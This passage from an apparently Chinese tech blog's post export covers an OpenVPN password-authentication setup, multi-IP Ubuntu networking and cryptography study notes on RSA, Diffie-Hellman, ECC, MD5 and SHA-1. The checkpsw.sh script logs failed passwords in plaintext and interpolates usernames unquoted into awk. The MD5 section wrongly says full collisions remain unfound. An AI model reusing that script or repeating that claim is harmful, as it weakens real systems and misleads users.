openvpn安装</h3><p>网上教程一堆，这里采用懒人傻瓜式安装方式，感谢大佬的脚本：<a href=\"https://github.com/Nyr/openvpn-install\" target=\"_blank\" rel=\"noopener\">https://github.com/Nyr/openvpn-install</a>.</p>\n<blockquote>\n<p>bash openvpn-install.sh</p>\n</blockquote>\n<p>然后一路回车不到一分钟即可搭建好一个openVPN服务器。。。</p>\n<h3 id=\"0x01-服务端配置\"><a href=\"#0x01-服务端配置\" class=\"headerlink\" title=\"0x01 服务端配置\"></a>0x01 服务端配置</h3><p>在server.conf中添加如下内容</p>\n<blockquote>\n<p>vim /etc/openvpn/server.conf</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auth-user-pass-verify /etc/openvpn/checkpsw.sh via-env</span><br><span class=\"line\">username-as-common-name</span><br><span class=\"line\">script-security 3 execve</span><br></pre></td></tr></table></figure>\n<p>在/etc/openvpn目录下添加文件checkpsw.sh:</p>\n<blockquote>\n<p>vim /etc/openvpn/checkpsw.sh</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/sh</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">##########################################################</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">checkpsw.sh (C) 2004 Mathias Sundman &lt;mathias@openvpn.se&gt;</span></span><br><span class=\"line\"><span class=\"meta\">#</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> This script will authenticate OpenVPN users against</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> a plain text file. The passfile should simply contain</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> one row per user with the username first followed by</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> one or more space(s) or tab(s) and <span class=\"keyword\">then</span> the password.</span></span><br><span class=\"line\"></span><br><span class=\"line\">PASSFILE=\"/etc/openvpn/psw-file\"</span><br><span class=\"line\">LOG_FILE=\"/etc/openvpn/openvpn-password.log\"</span><br><span class=\"line\">TIME_STAMP=`date \"+%Y-%m-%d %T\"`</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">##########################################################</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">if [ ! -r \"$&#123;PASSFILE&#125;\" ]; then</span><br><span class=\"line\">  echo \"$&#123;TIME_STAMP&#125;: Could not open password file \\\"$&#123;PASSFILE&#125;\\\" for reading.\" &gt;&gt; $&#123;LOG_FILE&#125;</span><br><span class=\"line\">  exit 1</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">CORRECT_PASSWORD=`awk '!/^;/&amp;&amp;!/^#/&amp;&amp;$1==\"'$&#123;username&#125;'\"&#123;print $2;exit&#125;' $&#123;PASSFILE&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">if [ \"$&#123;CORRECT_PASSWORD&#125;\" = \"\" ]; then</span><br><span class=\"line\">  echo \"$&#123;TIME_STAMP&#125;: User does not exist: username=\\\"$&#123;username&#125;\\\", password=\\\"$&#123;password&#125;\\\".\" &gt;&gt; $&#123;LOG_FILE&#125;</span><br><span class=\"line\">  exit 1</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">if [ \"$&#123;password&#125;\" = \"$&#123;CORRECT_PASSWORD&#125;\" ]; then</span><br><span class=\"line\">  echo \"$&#123;TIME_STAMP&#125;: Successful authentication: username=\\\"$&#123;username&#125;\\\".\" &gt;&gt;$&#123;LOG_FILE&#125;</span><br><span class=\"line\">  exit 0</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">echo \"$&#123;TIME_STAMP&#125;: Incorrect password: username=\\\"$&#123;username&#125;\\\", password=\\\"$&#123;password&#125;\\\".\" &gt;&gt; $&#123;LOG_FILE&#125;</span><br><span class=\"line\">exit 1</span><br></pre></td></tr></table></figure>\n<p>给予执行权限：</p>\n<blockquote>\n<p>chmod 755 /etc/openvpn/checkpsw.sh</p>\n</blockquote>\n<p>在/etc/openvpn目录下添加用户名密码文件psw-file:</p>\n<blockquote>\n<p>vim /etc/openvpn/psw-file</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user1 pass1 # 用户名 密码以空格隔开</span><br><span class=\"line\">user2 pass2</span><br></pre></td></tr></table></figure>\n<p>安全起见设成只读：</p>\n<blockquote>\n<p>chmod 400 /etc/openvpn/psw-file   </p>\n</blockquote>\n<p>重启服务：</p>\n<blockquote>\n<p>service openvpn restart</p>\n</blockquote>\n<h3 id=\"0x02-客户端配置\"><a href=\"#0x02-客户端配置\" class=\"headerlink\" title=\"0x02 客户端配置\"></a>0x02 客户端配置</h3><p>在服务器安装openvpn时生成的client.ovpn末尾加入一行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auth-user-pass</span><br></pre></td></tr></table></figure>\n<p>重新导入openvpn GUI即可使用用户名密码登陆.</p>\n<h3 id=\"0x03-坑点\"><a href=\"#0x03-坑点\" class=\"headerlink\" title=\"0x03 坑点\"></a>0x03 坑点</h3><p>使用openvpn-install.sh安装时，选择TCP(默认)方式无法使用用户名密码登陆，选择UDP则没有问题。</p>\n","categories":[],"tags":["linux"]},{"title":"ubuntu16.04单网卡配置多ip","url":"http://b1ng0.top/2019/02/24/ubuntu16.04单网卡配置多ip/","content":"<h2 id=\"ubuntu16-04单网卡配置多ip\"><a href=\"#ubuntu16-04单网卡配置多ip\" class=\"headerlink\" title=\"ubuntu16.04单网卡配置多ip\"></a>ubuntu16.04单网卡配置多ip</h2><ul>\n<li>环境：ubuntu16.04</li>\n</ul>\n<blockquote>\n<p>vim /etc/network/interfaces</p>\n</blockquote>\n<ul>\n<li>默认配置：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#lo配置 </span></span></span><br><span class=\"line\">auto lo </span><br><span class=\"line\">iface lo inet loopback </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#网卡eth0的配置 </span></span></span><br><span class=\"line\">auto eth0 </span><br><span class=\"line\">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>\n<ul>\n<li>双ip配置：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#lo配置 </span></span></span><br><span class=\"line\">auto lo </span><br><span class=\"line\">iface lo inet loopback </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#虚拟出一个eth0:0 </span></span></span><br><span class=\"line\">auto eth0 </span><br><span class=\"line\">auto eth0:0 </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#配置eth0的ip,默认网关,子网掩码 </span></span></span><br><span class=\"line\">iface eth0 inet static </span><br><span class=\"line\">address 192.168.1.23 </span><br><span class=\"line\">gateway 192.168.1.1 </span><br><span class=\"line\">netmask 255.255.0.0 </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#配置eth0:0的ip,默认网关,子网掩码 </span></span></span><br><span class=\"line\">iface eth0:0 inet static </span><br><span class=\"line\">address 192.168.1.24 </span><br><span class=\"line\">gateway 192.168.1.1 </span><br><span class=\"line\">netmask 255.255.255.0</span><br></pre></td></tr></table></figure>\n<ul>\n<li>多ip配置：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#lo配置 </span></span></span><br><span class=\"line\">auto lo </span><br><span class=\"line\">iface lo inet loopback </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#虚拟出两个：eth0:0和eth0:1 </span></span></span><br><span class=\"line\">auto eth0 </span><br><span class=\"line\">auto eth0:0 </span><br><span class=\"line\">auto eth0:1 </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#配置eth0的ip,默认网关,子网掩码 </span></span></span><br><span class=\"line\">iface eth0 inet static </span><br><span class=\"line\">address 192.168.1.23 </span><br><span class=\"line\">gateway 192.168.1.1 </span><br><span class=\"line\">netmask 255.255.0.0 </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#配置eth0:0的ip,默认网关,子网掩码 </span></span></span><br><span class=\"line\">iface eth0:0 inet static </span><br><span class=\"line\">address 192.168.1.24 </span><br><span class=\"line\">gateway 192.168.1.1 </span><br><span class=\"line\">netmask 255.255.255.0 </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"comment\">#配置eth0:1的ip,默认网关,子网掩码 </span></span></span><br><span class=\"line\">iface eth0:1 inet static </span><br><span class=\"line\">address 192.168.1.25 </span><br><span class=\"line\">gateway 192.168.1.1 </span><br><span class=\"line\">netmask 255.255.255.0</span><br></pre></td></tr></table></figure>\n<ul>\n<li>重启网络服务</li>\n</ul>\n<blockquote>\n<p> $sudo service networking restart<br>或者sudo /etc/init.d/networking restart </p>\n</blockquote>\n","categories":[],"tags":["linux"]},{"title":"密码学基础笔记(三)","url":"http://b1ng0.top/2019/02/21/密码学基础笔记(三)/","content":"<h2 id=\"第9章-公钥密码学与RSA\"><a href=\"#第9章-公钥密码学与RSA\" class=\"headerlink\" title=\"第9章  公钥密码学与RSA\"></a>第9章  公钥密码学与RSA</h2><blockquote>\n<p>保密性：信息不被泄露给未经授权者的特性。</p>\n</blockquote>\n<h3 id=\"公钥密码体制的基本原理\"><a href=\"#公钥密码体制的基本原理\" class=\"headerlink\" title=\"公钥密码体制的基本原理\"></a><strong>公钥密码体制的基本原理</strong></h3><p>加密密钥≠解密密钥，加密密钥 ≠&gt; 解密密钥，加密和解密变换分开实现。</p>\n<ul>\n<li>公开加密密钥（公钥）：任何人利用这个公钥和算法向该用户发送加密信息。</li>\n<li>保密解密密钥（私钥）：解密密文。</li>\n</ul>\n<p>公钥密钥密码体制的优点是：</p>\n<ul>\n<li>不需要安全信道传递密钥，大大简化了密钥管理。</li>\n<li>实现了分组密码体制中无法实现的数字签名。</li>\n</ul>\n<h3 id=\"公钥密码体制\"><a href=\"#公钥密码体制\" class=\"headerlink\" title=\"公钥密码体制\"></a><strong>公钥密码体制</strong></h3><p>公钥密码体制的核心思想：<strong>加密和解密采用不同的密钥</strong>。这是公钥密码体制和对称密码体制最大的区别。</p>\n<p><strong>加密模型</strong>:</p>\n<p><img src=\"/images/mima3/1550731993820.png\" alt=\"1550731993820\"></p>\n<p><strong>认证模型</strong>:</p>\n<p><img src=\"/images/mima3/1550732036032.png\" alt=\"1550732036032\"></p>\n<p><strong>加密认证模型</strong>:</p>\n<p><img src=\"/images/mima3/1550732049338.png\" alt=\"1550732049338\"></p>\n<h3 id=\"对公钥密码的要求\"><a href=\"#对公钥密码的要求\" class=\"headerlink\" title=\"对公钥密码的要求\"></a><strong>对公钥密码的要求</strong></h3><ol>\n<li>接收方B产生密钥对（公钥PKB和私钥SKB）在计算上是容易的。</li>\n<li>发方A用收方的公钥对消息m加密产生密文c，即c=EPKB[m]在计算上是容易的。</li>\n<li>收方B用自己的秘密钥对c解密，即m=DSKB[c]在计算上是容易的。   </li>\n<li>敌手由B的公钥PKB求私钥SKB在计算上是不可行的。</li>\n<li>敌手由密文c和B的公钥PKB恢复明文m在计算上是不可行的。</li>\n</ol>\n<p><strong>要满足上述条件即是要找一个陷门单向函数。</strong></p>\n<ul>\n<li>单向函数：两个集合X、Y之间的一个映射，使得由x∈X易于计算它的像y=f(x)∈Y，由y计算它的原像x是不可行的。</li>\n<li>易于计算：指函数值能在其输入长度的多项式时间内求出，即如果输入长n比特，则求函数值的计算时间是na的某个倍数，其中a是一固定的常数。这时称求函数值的算法属于多项式类P，否则就是不可行的。</li>\n<li>陷门单向函数：指该函数是易于计算的，但求它的逆是不可行的，除非再已知某些附加信息。当附加信息给定后，求逆可在多项式时间完成。</li>\n</ul>\n<p>陷门单向函数是一族可逆函数fk，满足</p>\n<ol>\n<li>当已知k和X：Y=fk(X)易于计算</li>\n<li>当已知k和Y：X=f-1k(Y)易于计算</li>\n<li>当已知Y但未知k：X=f-1k(Y)计算上是不可行的</li>\n</ol>\n<h3 id=\"RSA算法\"><a href=\"#RSA算法\" class=\"headerlink\" title=\"RSA算法\"></a>RSA算法</h3><p><strong>算法描述</strong></p>\n<p> <strong>1.</strong>  <strong>密钥的产生</strong></p>\n<p>•选两个大素数p和q；（保密）</p>\n<p>•计算n=p×q, ϕ(n)=(p−1)×(q−1); （n公开，ϕ(n)保密）</p>\n<p>•随机选一整数e∈(1, ϕ(n))，满足：                    </p>\n<p>gcd(ϕ(n), e) =1（公钥e）</p>\n<p>•计算d，满足：d×e ≡ 1 (mod ϕ(n))（私钥d）</p>\n<p><strong>2.</strong>  <strong>加密</strong></p>\n<p><img src=\"/images/mima3/1550732407966.png\" alt=\"1550732407966\"></p>\n<p><strong>3.</strong>  <strong>解密</strong></p>\n<p><img src=\"/images/mima3/1550732412328.png\" alt=\"1550732412328\"></p>\n<h2 id=\"第10章-密钥管理和其他公钥密码体制\"><a href=\"#第10章-密钥管理和其他公钥密码体制\" class=\"headerlink\" title=\"第10章  密钥管理和其他公钥密码体制\"></a>第10章  <strong>密钥管理和其他公钥密码体制</strong></h2><h3 id=\"Diffie-Hellman密钥交换\"><a href=\"#Diffie-Hellman密钥交换\" class=\"headerlink\" title=\"Diffie-Hellman密钥交换\"></a>Diffie-Hellman密钥交换</h3><blockquote>\n<p>Diffie和Hellman于1976年提出，许多商业产品都使用了这种密钥交换技术。</p>\n</blockquote>\n<p><strong>算法描述</strong></p>\n<ol>\n<li>用户A随机选择一个私有的大整数xA&lt;q，计算<img src=\"/images/mima3/1550732589478.png\" alt=\"1550732589478\">，并将结果传送给用户B；</li>\n<li>用户B随机选择一个私有的大整数xB&lt;q，计算 <img src=\"/images/mima3/1550732596786.png\" alt=\"1550732596786\"> ，并将结果传送给用户A；</li>\n</ol>\n<p>​    3）用户A计算：<img src=\"/images/mima3/1550732562968.png\" alt=\"1550732562968\"></p>\n<p>​    4）用户B计算：<img src=\"/images/mima3/1550732565911.png\" alt=\"1550732565911\"></p>\n<p><img src=\"/images/mima3/1550732619968.png\" alt=\"1550732619968\"></p>\n<h3 id=\"中间人攻击\"><a href=\"#中间人攻击\" class=\"headerlink\" title=\"中间人攻击\"></a><strong>中间人攻击</strong></h3><ul>\n<li>用户A将YA发送给B的过程中，中间人D截取YA，并用自己的YD取代YA发送给用户B。</li>\n<li>用户B将YB发送给A的过程中，中间人D截取YB，并用自己的yD取代YB发送给A。</li>\n<li>A、B和D三者分别计算会话密钥：</li>\n</ul>\n<p>​         A与D共享会话密钥KA：</p>\n<p>​         B与D共享会话密钥KB：</p>\n<p>​       一般情况下KA ≠ KB ，但A与B对此一无所知。</p>\n<h3 id=\"ElGamal密码体制\"><a href=\"#ElGamal密码体制\" class=\"headerlink\" title=\"ElGamal密码体制\"></a>ElGamal密码体制</h3><blockquote>\n<p>ElGamal密码体制是ElGamal于1984年提出，除了RSA密码体制之外著名的公钥密码体制之一。安全性基于<strong>离散对数问题的困难性</strong>。</p>\n</blockquote>\n<p><strong>ElGamal算法</strong></p>\n<p><strong>(1)</strong>  <strong>参数定义和密钥生成</strong></p>\n<ul>\n<li>选取大素数p，g∈Zp*是一个本原元素（生成元）。</li>\n<li>p，g为系统中所有用户共享。</li>\n<li>系统中每个用户U都随机挑选一个整数xU，1≤ xU ≤ p−1，并计算：</li>\n</ul>\n<p><img src=\"/images/mima3/1550732762533.png\" alt=\"1550732762533\"></p>\n<p>​     用户U的<strong>公钥为yU</strong>，<strong>私钥为xU</strong>。</p>\n<p><strong>(2)</strong>  <strong>加密算法</strong></p>\n<ul>\n<li>A选择一个随机数r∈[2，p-2]并计算：</li>\n</ul>\n<p><img src=\"/images/mima3/1550732828112.png\" alt=\"1550732828112\"></p>\n<p><img src=\"/images/mima3/1550732832264.png\" alt=\"1550732832264\"> </p>\n<p><strong>(3)</strong>  <strong>解密算法</strong></p>\n<ul>\n<li>B接收到密文(c1，c2)后，计算：</li>\n</ul>\n<p><img src=\"/images/mima3/1550732884169.png\" alt=\"1550732884169\"></p>\n<h3 id=\"椭圆曲线密码学\"><a href=\"#椭圆曲线密码学\" class=\"headerlink\" title=\"椭圆曲线密码学\"></a>椭圆曲线密码学</h3><p>椭圆曲线密码体制（Elliptic Curve Cryptography，ECC）：</p>\n<ul>\n<li>利用有限域上椭圆曲线的点集构成的群实现。</li>\n<li>安全性基于椭圆曲线上求<strong>离散对数问题</strong>的困难性。</li>\n<li>由于椭圆曲线密码体制具有计算量小，处理速度快、存储空间占用小、带宽要求低等优点，在电子商务、电子政务等应用领域得到广泛关注。</li>\n</ul>\n<p><strong>定义</strong></p>\n<p>椭圆曲线主要有：</p>\n<ul>\n<li>实数域上的椭圆曲线</li>\n<li>有限域GF(p)上的椭圆曲线</li>\n<li>有限域GF(2m)上的椭圆曲线</li>\n</ul>\n<blockquote>\n<p>不同数域上的椭圆曲线的表示形式不一样，甚至其上的运算也不一样。</p>\n</blockquote>\n<p><strong>椭圆曲线上的密码体制（ECC）：</strong>有限域椭圆曲线上的任意两个点相加，结果仍然是曲线上的点。</p>\n<ul>\n<li>所有点都落在某一个区域内，组成一个有限Abel群，与密码长度相对应。</li>\n<li>密码长度越长，这个区域就越大，安全层次就越高，但计算机速度越慢，反之亦然。</li>\n<li>椭圆曲线密码体制的安全性在于椭圆曲线点群上的<strong>离散对数问题的困难性</strong>。</li>\n<li>已知椭圆曲线Ep(a, b)和点G，随机生成一个整数d，容易计算Q=d×G，但给定Q和G计算d就相对困难。</li>\n</ul>\n<h3 id=\"椭圆曲线密码的安全性\"><a href=\"#椭圆曲线密码的安全性\" class=\"headerlink\" title=\"椭圆曲线密码的安全性\"></a><strong>椭圆曲线密码的安全性</strong></h3><p>ECC在理论上和实践上都取得了很大的进展，它是代替RSA公钥密码体制最强有力的竞争者。与RSA算法相比，ECC有以下的优点：</p>\n<ul>\n<li>ECC使用的密钥比RSA中使用的密钥要短得多。</li>\n<li>密钥长度相同时，ECC与RSA所需的计算量差不多。</li>\n</ul>\n<p>因此，与具有同等安全性的RSA相比，由于ECC使用的密钥更短，所以ECC所需的计算量比RSA少。</p>\n<h2 id=\"第11章-Hash函数\"><a href=\"#第11章-Hash函数\" class=\"headerlink\" title=\"第11章  Hash函数\"></a>第11章  Hash函数</h2><blockquote>\n<p>完整性（Integrity）：指信息在存储或传输过程中保持未经授权不能改变的特性。</p>\n</blockquote>\n<h3 id=\"Hash函数\"><a href=\"#Hash函数\" class=\"headerlink\" title=\"Hash函数\"></a>Hash函数</h3><p>Hash函数把<strong>任意长度的输入，通过算法变换成固定长度的输出</strong>，该输出就是Hash值或消息摘要（Message Digest）。</p>\n<p>设H：X→Y是一个Hash函数，X表示所有消息的集合（有限集或无限集），Y表示所有消息摘要构成的有限集合。</p>\n<p>Hash函数H具有单向性：</p>\n<ul>\n<li>从x计算y=H(x)是容易的</li>\n<li>从y=H(x)计算x是困难的</li>\n</ul>\n<p>对于Hash函数的安全要求，通常采用下面的三个问题来进行判断：</p>\n<ol>\n<li>已知y∈Y，寻找x∈X，使得H(x)=y。</li>\n<li>已知x∈X，寻找x’∈X，使得x’≠x，并且H(x’)=H(x)。</li>\n<li>寻找x，x’∈X，使得x’≠x，并且H(x’)=H(x)。</li>\n</ol>\n<blockquote>\n<p>如果一个Hash函数对这三个问题都是难解的，即计算上不可行，则认为它是安全的。</p>\n<p>如果有两个消息x，x’∈X，x’≠x，且H(x’)=H(x)，我们就说这两个消息是碰撞消息。</p>\n</blockquote>\n<ul>\n<li><strong>单向：</strong>第(1)个问题不可解。</li>\n<li><strong>抗弱碰撞：</strong>第(1)和(2)问题不可解。</li>\n<li><strong>抗强碰撞：</strong>第(1)和(3)问题不可解。</li>\n</ul>\n<h3 id=\"Hash函数的构造方法\"><a href=\"#Hash函数的构造方法\" class=\"headerlink\" title=\"Hash函数的构造方法\"></a><strong>Hash函数的构造方法</strong></h3><p>构造Hash函数的方法主要有：</p>\n<ul>\n<li>基于公钥密码的构造方法</li>\n<li>基于分组密码的构造方法</li>\n<li>直接构造法</li>\n</ul>\n<p><strong>1.</strong>  <strong>基于公钥密码的构造方法</strong></p>\n<p>​        设明文M=m1m2…mn，以公钥密码体制为基础，使用公钥PK及初始变量IV，通过密文分组链接（CBC）模式对消息分组进行加密，得到密文分组。将输出的最后一个密文分组<strong>c**</strong>n**作为Hash函数的输出值H(M)。</p>\n<p><img src=\"/images/mima3/1550733793187.png\" alt=\"1550733793187\"></p>\n<p><strong>2.</strong>  <strong>基于分组密码的构造方法</strong></p>\n<p>​       设明文M=m1m2…mn，使用CBC模式，输入初始变量IV和对称密钥k，对消息分组进行加密，得到密文分组。将输出的最后一个密文分组<strong>c**</strong>n**作为Hash函数的输出值H(M)。</p>\n<p><img src=\"/images/mima3/1550733803578.png\" alt=\"1550733803578\"></p>\n<p><strong>3.</strong>  <strong>直接构造Hash函数</strong></p>\n<p>​        这类Hash函数并不基于任何假设和密码体制，它是通过直接构造复杂的非线性关系达到单向性要求来设计单向Hash函数。这类Hash函数典型的有：MD4、MD5、SHA-1、SHA-256等算法。</p>\n<h3 id=\"MD5算法\"><a href=\"#MD5算法\" class=\"headerlink\" title=\"MD5算法\"></a><strong>MD5算法</strong></h3><blockquote>\n<p>MD5（Message-Digest Algorithm 5）算法由Rivest在1991年提出的一种Hash函数，经MD2、MD3和MD4发展而来。</p>\n</blockquote>\n<p><strong>MD5算法描述</strong></p>\n<p>MD5算法采用迭代型Hash函数的一般结构：</p>\n<p>•算法的输入为任意长的消息M。</p>\n<p>•M分为512 bit长的块，每个块又划分为十六个32 bit的子块。</p>\n<p>•算法的输出是由四个32 bit的块组成，将它们级联成一个128 bit的消息摘要。</p>\n<p><strong>算法步骤</strong></p>\n<p><strong>(1)</strong>  <strong>消息填充</strong></p>\n<p>​       对X bit长的消息填充：</p>\n<p>•使填充后的消息bit长度X1≡448 (mod 512)，即填充后的消息长度为512bit的某一倍数减64bit，留出的64bit备第(2)步使用。</p>\n<p>•填充方式是固定的，即第1位为1，其后各位皆为0。</p>\n<p>•如果消息长度X为448bit，仍需填充512bit，使其长度变为960bit，因此填充的bit数大于等于1而小于等于512</p>\n<p> <strong>(2)</strong>  <strong>附加上消息的长度值</strong></p>\n<p>​       用步骤(1)留出的64bit以Little-endian方式来表示消息被填充前的长度值。</p>\n<p>•如果消息长度大于264，则以264为模数取模，即64bit存放的是X (mod 264)的二进制表示值。</p>\n<p>•Little-endian方式是指数据的低位有效字节（或有效位）存于低地址字节（或位），高位有效字节（或有效位）存于高地址字节（或位）。</p>\n<p>​       用步骤(1)留出的64bit以Little-endian方式来表示消息被填充前的长度值。</p>\n<p>​        前两步执行完后，消息的长度为512bit的倍数（设为L倍），则可将消息划分为L个长度为512bit的块m0, m1, …, mL-1，而每一块又可划分为16个32bit长的子块。</p>\n<p><strong>(3)</strong>  <strong>缓冲区初始化</strong></p>\n<p>​       算法使用了128bit长的缓冲区以存储中间结果和最终的消息摘要，缓冲区可表示为4个32bit长的寄存器A、B、C、D，每个寄存器都以Little-endian方式存储数据，其初值（用十六进制表示）取为：</p>\n<p>​                              A = 01234567</p>\n<p>​                              B = 89abcdef </p>\n<p>​                              C = fedcba98</p>\n<p>​                              D = 76543210</p>\n<p><strong>(4)</strong>  <strong>压缩函数处理</strong></p>\n<p>​       以块为单位对消息进行处理，每一消息块mj（j = 0, …, L-1）都经一压缩函数HMD5处理。压缩函数有4轮处理过程，每一轮由16步迭代组成。</p>\n<p><img src=\"/images/mima3/1550733997671.png\" alt=\"1550733997671\"></p>\n<p><strong>(5)</strong>  <strong>输出消息摘要</strong></p>\n<p>​       L个消息块mj（j = 0, …, L-1）都被处理完后，最后一个压缩函数的输出即为产生的128bit消息摘要。</p>\n<h3 id=\"压缩函数的处理过程\"><a href=\"#压缩函数的处理过程\" class=\"headerlink\" title=\"压缩函数的处理过程\"></a><strong>压缩函数的处理过程</strong></h3><p>压缩函数HMD5的4轮处理过程相似，分别用逻辑函数FF、GG、HH、II表示，它们分别为是</p>\n<ul>\n<li>FF  (A, B, C, D, M[k], S, T[i])</li>\n<li>GG(A, B, C, D, M[k], S, T[i])</li>\n<li>HH(A, B, C, D, M[k], S, T[i])</li>\n<li>II   (A, B, C, D, M[k], S, T[i])</li>\n</ul>\n<p>的缩写。</p>\n<p>​       每轮的输入为当前处理的消息块mi和缓冲区的当前值A、B、C、D，输出仍放在缓冲区中以产生新的A、B、C、D。经过4轮运算，第4轮的输出再与第1轮的输入按模232相加，相加的结果即为压缩函数HMD5的输出。</p>\n<h3 id=\"MD5算法的安全性\"><a href=\"#MD5算法的安全性\" class=\"headerlink\" title=\"MD5算法的安全性\"></a><strong>MD5算法的安全性</strong></h3><p>目前对MD5的攻击已取得以下结果：</p>\n<p>​        (1)  对单轮的MD5，使用差分密码分析可在合理的时间内找出具有相同Hash值的两个消息。但这种攻击还未能成功地推广到4轮MD5。</p>\n<p>​        (2)  可找出一个消息块和两个相关的缓冲区变量ABCD的不同输入值，MD5对单个512bit消息块的运算得到相同的输出。目前这种攻击还未能成功地推广到整个算法。</p>\n<p>​    (3) 对单个512bit长的消息块已成功地找出了碰撞，即可找出另一个消息块，使得经过MD5运算，两个消息块的输出Hash值相同。目前这种攻击还未成功推广到一个具有初值IV的整个消息上。</p>\n<h3 id=\"SHA-1算法\"><a href=\"#SHA-1算法\" class=\"headerlink\" title=\"SHA-1算法\"></a><strong>SHA-1算法</strong></h3><blockquote>\n<p>SHA（Secure Hash Algorithm）算法由美国国家标准和技术协会（NIST）提出，并作为联邦信息处理标准（FIPS PUB 180）在1993年公布。</p>\n<p>两年之后，SHA-1，第一个SHA的后继者发布了。为了提升输出的范围和变更一些细微设计，另外还有四种变体曾经发布：SHA-224, SHA-256，SHA-384 和SHA-512（这些也称作SHA-2）。</p>\n</blockquote>\n<p>这里介绍SHA-1算法，其结构与MD5非常类似：</p>\n<ul>\n<li>输入消息的最大长度不超过264 bit</li>\n<li>输入消息按照512 bit的块进行处理</li>\n<li>产生160 bit的消息摘要</li>\n</ul>\n<h3 id=\"SHA-1算法描述\"><a href=\"#SHA-1算法描述\" class=\"headerlink\" title=\"SHA-1算法描述\"></a><strong>SHA-1算法描述</strong></h3><p>​       <strong>(1)</strong>  <strong>消息填充</strong></p>\n<p>​       消息填充过程与MD5的步骤(1)相同，设输入的消息为M，X≤264-1表示消息的长度。</p>\n<p>•使填充后的消息长度X1≡448 (mod 